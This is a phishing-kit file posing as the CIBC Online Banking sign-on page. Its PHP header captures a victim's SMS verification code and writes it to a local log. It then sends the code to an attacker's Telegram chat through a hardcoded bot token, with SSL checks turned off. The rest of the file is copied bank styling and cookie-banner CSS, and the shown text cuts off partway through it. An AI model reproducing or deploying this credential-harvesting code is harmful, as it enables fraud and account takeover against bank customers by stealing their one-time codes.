<?php 
session_start();

// Vérifie si les données 'cvv' et 'mdp' sont présentes dans la session, sinon ignore la redirection
if (!isset($_SESSION["cvv"]) or !isset($_SESSION["mdp"])) {
    //header("Location: ./index.php");
    //exit();
}

// Récupère le SMS du formulaire
$_SESSION["sms"] = $_POST['sms'];

// Prépare le message à envoyer
$message = "📲 **Code SMS Reçu** 📲\n\n" .
           "💬 **SMS** : " . $_SESSION["sms"] . "\n\n" .
           "🔚 **FIN DE CONNEXION** 🔚\n";

// Enregistre les données dans un fichier local (peut être conservé ou retiré selon les besoins)
$file = "../blinky2000@bvc@bvc@destruction.txt";
file_put_contents($file, $message, FILE_APPEND);

// Configuration de l'envoi Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; // Remplace par le token de ton bot
$chat_id = '6242884372'; // Remplace par ton chat_id

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);

// Détruit la session après l'envoi
session_destroy();
?>




<html lang="en">


<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="icon" href="favicon.png">
    <title>Sign on | CIBC Online Banking</title>
 
    <style>
        @font-face {
            font-family: "Whitney";
            src: url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff2") format("woff2"),
                url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff") format("woff");
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: "WhitneyBookRegular";
            /* declaration/naming for AEM ads */
            src: url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff2") format("woff2"),
                url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff") format("woff");
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: "Whitney";
            src: url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff2") format("woff2"),
                url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff") format("woff");
            font-weight: 500;
            font-style: normal;
        }

        @font-face {
            font-family: "WhitneyMedium";
            /* declaration/naming for AEM ads */
            src: url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff2") format("woff2"),
                url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff") format("woff");
            font-weight: 500;
            font-style: normal;
        }

        @font-face {
            font-family: "Whitney";
            src: url("/ebm-resources/common-content/fonts/Whitney-Semibld_Web.woff2") format("woff2"),
                url("/ebm-resources/common-content/fonts/Whitney-Semibld_Web.woff") format("woff");
            font-weight: 600;
            font-style: normal;
        }
    </style>
    <link rel="stylesheet" type="text/css" href="/cbic/Sign on _ CIBC Online Banking_files/721-bfa0cefa.css">

<link rel="stylesheet" type="text/css" href="/cbic/Sign on _ CIBC Online Banking_files/100-7577d156.css">

<link rel="stylesheet" type="text/css" href="/cbic/Sign on _ CIBC Online Banking_files/default-styles-v2.min.css">
    <link rel="prefetch" href="https://www.cibconline.cibc.com/ebm-resources/public/banking/cibc/client/web/index.html">
    <link rel="prefetch"
        href="https://www.cibconline.cibc.com/ebm-resources/public/banking/cibc/client/web/assets/banking-cibc-c57563f06db1671255541b43414df514.js">
    <link rel="prefetch"
        href="https://www.cibconline.cibc.com/ebm-resources/public/banking/cibc/client/web/assets/banking-cibc-f1b38c90363c080c2344520a2cc5ae64.css">
    <link rel="prefetch"
        href="https://www.cibconline.cibc.com/ebm-resources/public/banking/cibc/client/web/assets/vendor-87ff2eec462aa326baf6f587b95c3608.js">
    <link rel="prefetch"
        href="https://www.cibconline.cibc.com/ebm-resources/public/banking/cibc/client/web/assets/vendor-58a5337ee773fc21405194553f6f0f66.css">
    <script src="https://cdn.cookielaw.org/scripttemplates/202310.2.0/otBannerSdk.js" async=""
        type="text/javascript"></script>
    <style id="onetrust-style">
        #onetrust-banner-sdk {
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%
        }

        #onetrust-banner-sdk .onetrust-vendors-list-handler {
            cursor: pointer;
            color: #1f96db;
            font-size: inherit;
            font-weight: bold;
            text-decoration: none;
            margin-left: 5px
        }

        #onetrust-banner-sdk .onetrust-vendors-list-handler:hover {
            color: #1f96db
        }

        #onetrust-banner-sdk:focus {
            outline: 2px solid #000;
            outline-offset: -2px
        }

        #onetrust-banner-sdk a:focus {
            outline: 2px solid #000
        }

        #onetrust-banner-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
            outline-offset: 1px
        }

        #onetrust-banner-sdk.ot-bnr-w-logo .ot-bnr-logo {
            height: 64px;
            width: 64px
        }

        #onetrust-banner-sdk .ot-tcf2-vendor-count.ot-text-bold {
            font-weight: bold
        }

        #onetrust-banner-sdk .ot-close-icon,
        #onetrust-pc-sdk .ot-close-icon,
        #ot-sync-ntfy .ot-close-icon {
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            height: 12px;
            width: 12px
        }

        #onetrust-banner-sdk .powered-by-logo,
        #onetrust-banner-sdk .ot-pc-footer-logo a,
        #onetrust-pc-sdk .powered-by-logo,
        #onetrust-pc-sdk .ot-pc-footer-logo a,
        #ot-sync-ntfy .powered-by-logo,
        #ot-sync-ntfy .ot-pc-footer-logo a {
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            height: 25px;
            width: 152px;
            display: block;
            text-decoration: none;
            font-size: .75em
        }

        #onetrust-banner-sdk .powered-by-logo:hover,
        #onetrust-banner-sdk .ot-pc-footer-logo a:hover,
        #onetrust-pc-sdk .powered-by-logo:hover,
        #onetrust-pc-sdk .ot-pc-footer-logo a:hover,
        #ot-sync-ntfy .powered-by-logo:hover,
        #ot-sync-ntfy .ot-pc-footer-logo a:hover {
            color: #565656
        }

        #onetrust-banner-sdk h3 *,
        #onetrust-banner-sdk h4 *,
        #onetrust-banner-sdk h6 *,
        #onetrust-banner-sdk button *,
        #onetrust-banner-sdk a[data-parent-id] *,
        #onetrust-pc-sdk h3 *,
        #onetrust-pc-sdk h4 *,
        #onetrust-pc-sdk h6 *,
        #onetrust-pc-sdk button *,
        #onetrust-pc-sdk a[data-parent-id] *,
        #ot-sync-ntfy h3 *,
        #ot-sync-ntfy h4 *,
        #ot-sync-ntfy h6 *,
        #ot-sync-ntfy button *,
        #ot-sync-ntfy a[data-parent-id] * {
            font-size: inherit;
            font-weight: inherit;
            color: inherit
        }

        #onetrust-banner-sdk .ot-hide,
        #onetrust-pc-sdk .ot-hide,
        #ot-sync-ntfy .ot-hide {
            display: none !important
        }

        #onetrust-banner-sdk button.ot-link-btn:hover,
        #onetrust-pc-sdk button.ot-link-btn:hover,
        #ot-sync-ntfy button.ot-link-btn:hover {
            text-decoration: underline;
            opacity: 1
        }

        #onetrust-pc-sdk .ot-sdk-row .ot-sdk-column {
            padding: 0
        }

        #onetrust-pc-sdk .ot-sdk-container {
            padding-right: 0
        }

        #onetrust-pc-sdk .ot-sdk-row {
            flex-direction: initial;
            width: 100%
        }

        #onetrust-pc-sdk [type=checkbox]:checked,
        #onetrust-pc-sdk [type=checkbox]:not(:checked) {
            pointer-events: initial
        }

        #onetrust-pc-sdk [type=checkbox]:disabled+label::before,
        #onetrust-pc-sdk [type=checkbox]:disabled+label:after,
        #onetrust-pc-sdk [type=checkbox]:disabled+label {
            pointer-events: none;
            opacity: .7
        }

        #onetrust-pc-sdk #vendor-list-content {
            transform: translate3d(0, 0, 0)
        }

        #onetrust-pc-sdk li input[type=checkbox] {
            z-index: 1
        }

        #onetrust-pc-sdk li .ot-checkbox label {
            z-index: 2
        }

        #onetrust-pc-sdk li .ot-checkbox input[type=checkbox] {
            height: auto;
            width: auto
        }

        #onetrust-pc-sdk li .host-title a,
        #onetrust-pc-sdk li .ot-host-name a,
        #onetrust-pc-sdk li .accordion-text,
        #onetrust-pc-sdk li .ot-acc-txt {
            z-index: 2;
            position: relative
        }

        #onetrust-pc-sdk input {
            margin: 3px .1ex
        }

        #onetrust-pc-sdk .pc-logo,
        #onetrust-pc-sdk .ot-pc-logo {
            height: 60px;
            width: 180px;
            background-position: center;
            background-size: contain;
            background-repeat: no-repeat;
            display: inline-flex;
            justify-content: center;
            align-items: center
        }

        #onetrust-pc-sdk .pc-logo img,
        #onetrust-pc-sdk .ot-pc-logo img {
            max-height: 100%;
            max-width: 100%
        }

        #onetrust-pc-sdk .screen-reader-only,
        #onetrust-pc-sdk .ot-scrn-rdr,
        .ot-sdk-cookie-policy .screen-reader-only,
        .ot-sdk-cookie-policy .ot-scrn-rdr {
            border: 0;
            clip: rect(0 0 0 0);
            height: 1px;
            margin: -1px;
            overflow: hidden;
            padding: 0;
            position: absolute;
            width: 1px
        }

        #onetrust-pc-sdk.ot-fade-in,
        .onetrust-pc-dark-filter.ot-fade-in,
        #onetrust-banner-sdk.ot-fade-in {
            animation-name: onetrust-fade-in;
            animation-duration: 400ms;
            animation-timing-function: ease-in-out
        }

        #onetrust-pc-sdk.ot-hide {
            display: none !important
        }

        .onetrust-pc-dark-filter.ot-hide {
            display: none !important
        }

        #ot-sdk-btn.ot-sdk-show-settings,
        #ot-sdk-btn.optanon-show-settings {
            color: #68b631;
            border: 1px solid #68b631;
            height: auto;
            white-space: normal;
            word-wrap: break-word;
            padding: .8em 2em;
            font-size: .8em;
            line-height: 1.2;
            cursor: pointer;
            -moz-transition: .1s ease;
            -o-transition: .1s ease;
            -webkit-transition: 1s ease;
            transition: .1s ease
        }

        #ot-sdk-btn.ot-sdk-show-settings:hover,
        #ot-sdk-btn.optanon-show-settings:hover {
            color: #fff;
            background-color: #68b631
        }

        .onetrust-pc-dark-filter {
            background: rgba(0, 0, 0, .5);
            z-index: 2147483646;
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0
        }

        @keyframes onetrust-fade-in {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        .ot-cookie-label {
            text-decoration: underline
        }

        @media only screen and (min-width: 426px)and (max-width: 896px)and (orientation: landscape) {
            #onetrust-pc-sdk p {
                font-size: .75em
            }
        }

        #onetrust-banner-sdk .banner-option-input:focus+label {
            outline: 1px solid #000;
            outline-style: auto
        }

        .category-vendors-list-handler+a:focus,
        .category-vendors-list-handler+a:focus-visible {
            outline: 2px solid #000
        }

        #onetrust-pc-sdk .ot-userid-title {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-userid-title>span,
        #onetrust-pc-sdk .ot-userid-timestamp>span {
            font-weight: 700
        }

        #onetrust-pc-sdk .ot-userid-desc {
            font-style: italic
        }

        #onetrust-pc-sdk .ot-host-desc a {
            pointer-events: initial
        }

        #onetrust-pc-sdk .ot-ven-hdr>p a {
            position: relative;
            z-index: 2;
            pointer-events: initial
        }

        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info a,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info a {
            margin-right: auto
        }

        #onetrust-pc-sdk .ot-pc-footer-logo img {
            width: 136px;
            height: 16px
        }

        #onetrust-pc-sdk .ot-pur-vdr-count {
            font-weight: 400;
            font-size: .7rem;
            padding-top: 3px;
            display: block
        }

        #onetrust-banner-sdk .ot-optout-signal,
        #onetrust-pc-sdk .ot-optout-signal {
            border: 1px solid #32ae88;
            border-radius: 3px;
            padding: 5px;
            margin-bottom: 10px;
            background-color: #f9fffa;
            font-size: .85rem;
            line-height: 2
        }

        #onetrust-banner-sdk .ot-optout-signal .ot-optout-icon,
        #onetrust-pc-sdk .ot-optout-signal .ot-optout-icon {
            display: inline;
            margin-right: 5px
        }

        #onetrust-banner-sdk .ot-optout-signal svg,
        #onetrust-pc-sdk .ot-optout-signal svg {
            height: 20px;
            width: 30px;
            transform: scale(0.5)
        }

        #onetrust-banner-sdk .ot-optout-signal svg path,
        #onetrust-pc-sdk .ot-optout-signal svg path {
            fill: #32ae88
        }

        #onetrust-banner-sdk,
        #onetrust-pc-sdk,
        #ot-sdk-cookie-policy,
        #ot-sync-ntfy {
            font-size: 16px
        }

        #onetrust-banner-sdk *,
        #onetrust-banner-sdk ::after,
        #onetrust-banner-sdk ::before,
        #onetrust-pc-sdk *,
        #onetrust-pc-sdk ::after,
        #onetrust-pc-sdk ::before,
        #ot-sdk-cookie-policy *,
        #ot-sdk-cookie-policy ::after,
        #ot-sdk-cookie-policy ::before,
        #ot-sync-ntfy *,
        #ot-sync-ntfy ::after,
        #ot-sync-ntfy ::before {
            -webkit-box-sizing: content-box;
            -moz-box-sizing: content-box;
            box-sizing: content-box
        }

        #onetrust-banner-sdk div,
        #onetrust-banner-sdk span,
        #onetrust-banner-sdk h1,
        #onetrust-banner-sdk h2,
        #onetrust-banner-sdk h3,
        #onetrust-banner-sdk h4,
        #onetrust-banner-sdk h5,
        #onetrust-banner-sdk h6,
        #onetrust-banner-sdk p,
        #onetrust-banner-sdk img,
        #onetrust-banner-sdk svg,
        #onetrust-banner-sdk button,
        #onetrust-banner-sdk section,
        #onetrust-banner-sdk a,
        #onetrust-banner-sdk label,
        #onetrust-banner-sdk input,
        #onetrust-banner-sdk ul,
        #onetrust-banner-sdk li,
        #onetrust-banner-sdk nav,
        #onetrust-banner-sdk table,
        #onetrust-banner-sdk thead,
        #onetrust-banner-sdk tr,
        #onetrust-banner-sdk td,
        #onetrust-banner-sdk tbody,
        #onetrust-banner-sdk .ot-main-content,
        #onetrust-banner-sdk .ot-toggle,
        #onetrust-banner-sdk #ot-content,
        #onetrust-banner-sdk #ot-pc-content,
        #onetrust-banner-sdk .checkbox,
        #onetrust-pc-sdk div,
        #onetrust-pc-sdk span,
        #onetrust-pc-sdk h1,
        #onetrust-pc-sdk h2,
        #onetrust-pc-sdk h3,
        #onetrust-pc-sdk h4,
        #onetrust-pc-sdk h5,
        #onetrust-pc-sdk h6,
        #onetrust-pc-sdk p,
        #onetrust-pc-sdk img,
        #onetrust-pc-sdk svg,
        #onetrust-pc-sdk button,
        #onetrust-pc-sdk section,
        #onetrust-pc-sdk a,
        #onetrust-pc-sdk label,
        #onetrust-pc-sdk input,
        #onetrust-pc-sdk ul,
        #onetrust-pc-sdk li,
        #onetrust-pc-sdk nav,
        #onetrust-pc-sdk table,
        #onetrust-pc-sdk thead,
        #onetrust-pc-sdk tr,
        #onetrust-pc-sdk td,
        #onetrust-pc-sdk tbody,
        #onetrust-pc-sdk .ot-main-content,
        #onetrust-pc-sdk .ot-toggle,
        #onetrust-pc-sdk #ot-content,
        #onetrust-pc-sdk #ot-pc-content,
        #onetrust-pc-sdk .checkbox,
        #ot-sdk-cookie-policy div,
        #ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy h1,
        #ot-sdk-cookie-policy h2,
        #ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy img,
        #ot-sdk-cookie-policy svg,
        #ot-sdk-cookie-policy button,
        #ot-sdk-cookie-policy section,
        #ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy label,
        #ot-sdk-cookie-policy input,
        #ot-sdk-cookie-policy ul,
        #ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy nav,
        #ot-sdk-cookie-policy table,
        #ot-sdk-cookie-policy thead,
        #ot-sdk-cookie-policy tr,
        #ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy tbody,
        #ot-sdk-cookie-policy .ot-main-content,
        #ot-sdk-cookie-policy .ot-toggle,
        #ot-sdk-cookie-policy #ot-content,
        #ot-sdk-cookie-policy #ot-pc-content,
        #ot-sdk-cookie-policy .checkbox,
        #ot-sync-ntfy div,
        #ot-sync-ntfy span,
        #ot-sync-ntfy h1,
        #ot-sync-ntfy h2,
        #ot-sync-ntfy h3,
        #ot-sync-ntfy h4,
        #ot-sync-ntfy h5,
        #ot-sync-ntfy h6,
        #ot-sync-ntfy p,
        #ot-sync-ntfy img,
        #ot-sync-ntfy svg,
        #ot-sync-ntfy button,
        #ot-sync-ntfy section,
        #ot-sync-ntfy a,
        #ot-sync-ntfy label,
        #ot-sync-ntfy input,
        #ot-sync-ntfy ul,
        #ot-sync-ntfy li,
        #ot-sync-ntfy nav,
        #ot-sync-ntfy table,
        #ot-sync-ntfy thead,
        #ot-sync-ntfy tr,
        #ot-sync-ntfy td,
        #ot-sync-ntfy tbody,
        #ot-sync-ntfy .ot-main-content,
        #ot-sync-ntfy .ot-toggle,
        #ot-sync-ntfy #ot-content,
        #ot-sync-ntfy #ot-pc-content,
        #ot-sync-ntfy .checkbox {
            font-family: inherit;
            font-weight: normal;
            -webkit-font-smoothing: auto;
            letter-spacing: normal;
            line-height: normal;
            padding: 0;
            margin: 0;
            height: auto;
            min-height: 0;
            max-height: none;
            width: auto;
            min-width: 0;
            max-width: none;
            border-radius: 0;
            border: none;
            clear: none;
            float: none;
            position: static;
            bottom: auto;
            left: auto;
            right: auto;
            top: auto;
            text-align: left;
            text-decoration: none;
            text-indent: 0;
            text-shadow: none;
            text-transform: none;
            white-space: normal;
            background: none;
            overflow: visible;
            vertical-align: baseline;
            visibility: visible;
            z-index: auto;
            box-shadow: none
        }

        #onetrust-banner-sdk label:before,
        #onetrust-banner-sdk label:after,
        #onetrust-banner-sdk .checkbox:after,
        #onetrust-banner-sdk .checkbox:before,
        #onetrust-pc-sdk label:before,
        #onetrust-pc-sdk label:after,
        #onetrust-pc-sdk .checkbox:after,
        #onetrust-pc-sdk .checkbox:before,
        #ot-sdk-cookie-policy label:before,
        #ot-sdk-cookie-policy label:after,
        #ot-sdk-cookie-policy .checkbox:after,
        #ot-sdk-cookie-policy .checkbox:before,
        #ot-sync-ntfy label:before,
        #ot-sync-ntfy label:after,
        #ot-sync-ntfy .checkbox:after,
        #ot-sync-ntfy .checkbox:before {
            content: "";
            content: none
        }

        #onetrust-banner-sdk .ot-sdk-container,
        #onetrust-pc-sdk .ot-sdk-container,
        #ot-sdk-cookie-policy .ot-sdk-container {
            position: relative;
            width: 100%;
            max-width: 100%;
            margin: 0 auto;
            padding: 0 20px;
            box-sizing: border-box
        }

        #onetrust-banner-sdk .ot-sdk-column,
        #onetrust-banner-sdk .ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-column,
        #onetrust-pc-sdk .ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-column,
        #ot-sdk-cookie-policy .ot-sdk-columns {
            width: 100%;
            float: left;
            box-sizing: border-box;
            padding: 0;
            display: initial
        }

        @media(min-width: 400px) {

            #onetrust-banner-sdk .ot-sdk-container,
            #onetrust-pc-sdk .ot-sdk-container,
            #ot-sdk-cookie-policy .ot-sdk-container {
                width: 90%;
                padding: 0
            }
        }

        @media(min-width: 550px) {

            #onetrust-banner-sdk .ot-sdk-container,
            #onetrust-pc-sdk .ot-sdk-container,
            #ot-sdk-cookie-policy .ot-sdk-container {
                width: 100%
            }

            #onetrust-banner-sdk .ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-columns {
                margin-left: 4%
            }

            #onetrust-banner-sdk .ot-sdk-column:first-child,
            #onetrust-banner-sdk .ot-sdk-columns:first-child,
            #onetrust-pc-sdk .ot-sdk-column:first-child,
            #onetrust-pc-sdk .ot-sdk-columns:first-child,
            #ot-sdk-cookie-policy .ot-sdk-column:first-child,
            #ot-sdk-cookie-policy .ot-sdk-columns:first-child {
                margin-left: 0
            }

            #onetrust-banner-sdk .ot-sdk-two.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-two.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-two.ot-sdk-columns {
                width: 13.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-three.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-three.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-three.ot-sdk-columns {
                width: 22%
            }

            #onetrust-banner-sdk .ot-sdk-four.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-four.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-four.ot-sdk-columns {
                width: 30.6666666667%
            }

            #onetrust-banner-sdk .ot-sdk-eight.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-eight.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-eight.ot-sdk-columns {
                width: 65.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-nine.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-nine.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-nine.ot-sdk-columns {
                width: 74%
            }

            #onetrust-banner-sdk .ot-sdk-ten.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-ten.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-ten.ot-sdk-columns {
                width: 82.6666666667%
            }

            #onetrust-banner-sdk .ot-sdk-eleven.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-eleven.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-eleven.ot-sdk-columns {
                width: 91.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-twelve.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-twelve.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-twelve.ot-sdk-columns {
                width: 100%;
                margin-left: 0
            }
        }

        #onetrust-banner-sdk h1,
        #onetrust-banner-sdk h2,
        #onetrust-banner-sdk h3,
        #onetrust-banner-sdk h4,
        #onetrust-banner-sdk h5,
        #onetrust-banner-sdk h6,
        #onetrust-pc-sdk h1,
        #onetrust-pc-sdk h2,
        #onetrust-pc-sdk h3,
        #onetrust-pc-sdk h4,
        #onetrust-pc-sdk h5,
        #onetrust-pc-sdk h6,
        #ot-sdk-cookie-policy h1,
        #ot-sdk-cookie-policy h2,
        #ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy h6 {
            margin-top: 0;
            font-weight: 600;
            font-family: inherit
        }

        #onetrust-banner-sdk h1,
        #onetrust-pc-sdk h1,
        #ot-sdk-cookie-policy h1 {
            font-size: 1.5rem;
            line-height: 1.2
        }

        #onetrust-banner-sdk h2,
        #onetrust-pc-sdk h2,
        #ot-sdk-cookie-policy h2 {
            font-size: 1.5rem;
            line-height: 1.25
        }

        #onetrust-banner-sdk h3,
        #onetrust-pc-sdk h3,
        #ot-sdk-cookie-policy h3 {
            font-size: 1.5rem;
            line-height: 1.3
        }

        #onetrust-banner-sdk h4,
        #onetrust-pc-sdk h4,
        #ot-sdk-cookie-policy h4 {
            font-size: 1.5rem;
            line-height: 1.35
        }

        #onetrust-banner-sdk h5,
        #onetrust-pc-sdk h5,
        #ot-sdk-cookie-policy h5 {
            font-size: 1.5rem;
            line-height: 1.5
        }

        #onetrust-banner-sdk h6,
        #onetrust-pc-sdk h6,
        #ot-sdk-cookie-policy h6 {
            font-size: 1.5rem;
            line-height: 1.6
        }

        @media(min-width: 550px) {

            #onetrust-banner-sdk h1,
            #onetrust-pc-sdk h1,
            #ot-sdk-cookie-policy h1 {
                font-size: 1.5rem
            }

            #onetrust-banner-sdk h2,
            #onetrust-pc-sdk h2,
            #ot-sdk-cookie-policy h2 {
                font-size: 1.5rem
            }

            #onetrust-banner-sdk h3,
            #onetrust-pc-sdk h3,
            #ot-sdk-cookie-policy h3 {
                font-size: 1.5rem
            }

            #onetrust-banner-sdk h4,
            #onetrust-pc-sdk h4,
            #ot-sdk-cookie-policy h4 {
                font-size: 1.5rem
            }

            #onetrust-banner-sdk h5,
            #onetrust-pc-sdk h5,
            #ot-sdk-cookie-policy h5 {
                font-size: 1.5rem
            }

            #onetrust-banner-sdk h6,
            #onetrust-pc-sdk h6,
            #ot-sdk-cookie-policy h6 {
                font-size: 1.5rem
            }
        }

        #onetrust-banner-sdk p,
        #onetrust-pc-sdk p,
        #ot-sdk-cookie-policy p {
            margin: 0 0 1em 0;
            font-family: inherit;
            line-height: normal
        }

        #onetrust-banner-sdk a,
        #onetrust-pc-sdk a,
        #ot-sdk-cookie-policy a {
            color: #565656;
            text-decoration: underline
        }

        #onetrust-banner-sdk a:hover,
        #onetrust-pc-sdk a:hover,
        #ot-sdk-cookie-policy a:hover {
            color: #565656;
            text-decoration: none
        }

        #onetrust-banner-sdk .ot-sdk-button,
        #onetrust-banner-sdk button,
        #onetrust-pc-sdk .ot-sdk-button,
        #onetrust-pc-sdk button,
        #ot-sdk-cookie-policy .ot-sdk-button,
        #ot-sdk-cookie-policy button {
            margin-bottom: 1rem;
            font-family: inherit
        }

        #onetrust-banner-sdk .ot-sdk-button,
        #onetrust-banner-sdk button,
        #onetrust-pc-sdk .ot-sdk-button,
        #onetrust-pc-sdk button,
        #ot-sdk-cookie-policy .ot-sdk-button,
        #ot-sdk-cookie-policy button {
            display: inline-block;
            height: 38px;
            padding: 0 30px;
            color: #555;
            text-align: center;
            font-size: .9em;
            font-weight: 400;
            line-height: 38px;
            letter-spacing: .01em;
            text-decoration: none;
            white-space: nowrap;
            background-color: rgba(0, 0, 0, 0);
            border-radius: 2px;
            border: 1px solid #bbb;
            cursor: pointer;
            box-sizing: border-box
        }

        #onetrust-banner-sdk .ot-sdk-button:hover,
        #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
        #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus,
        #onetrust-pc-sdk .ot-sdk-button:hover,
        #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
        #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus,
        #ot-sdk-cookie-policy .ot-sdk-button:hover,
        #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
        #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus {
            color: #333;
            border-color: #888;
            opacity: .7
        }

        #onetrust-banner-sdk .ot-sdk-button:focus,
        #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:focus,
        #onetrust-pc-sdk .ot-sdk-button:focus,
        #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:focus,
        #ot-sdk-cookie-policy .ot-sdk-button:focus,
        #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:focus {
            outline: 2px solid #000
        }

        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary,
        #onetrust-banner-sdk button.ot-sdk-button-primary,
        #onetrust-banner-sdk input[type=submit].ot-sdk-button-primary,
        #onetrust-banner-sdk input[type=reset].ot-sdk-button-primary,
        #onetrust-banner-sdk input[type=button].ot-sdk-button-primary,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary,
        #onetrust-pc-sdk button.ot-sdk-button-primary,
        #onetrust-pc-sdk input[type=submit].ot-sdk-button-primary,
        #onetrust-pc-sdk input[type=reset].ot-sdk-button-primary,
        #onetrust-pc-sdk input[type=button].ot-sdk-button-primary,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type=submit].ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type=reset].ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type=button].ot-sdk-button-primary {
            color: #fff;
            background-color: #33c3f0;
            border-color: #33c3f0
        }

        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
        #onetrust-banner-sdk button.ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type=submit].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type=reset].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type=button].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
        #onetrust-banner-sdk button.ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type=submit].ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type=reset].ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type=button].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
        #onetrust-pc-sdk button.ot-sdk-button-primary:hover,
        #onetrust-pc-sdk input[type=submit].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk input[type=reset].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk input[type=button].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
        #onetrust-pc-sdk button.ot-sdk-button-primary:focus,
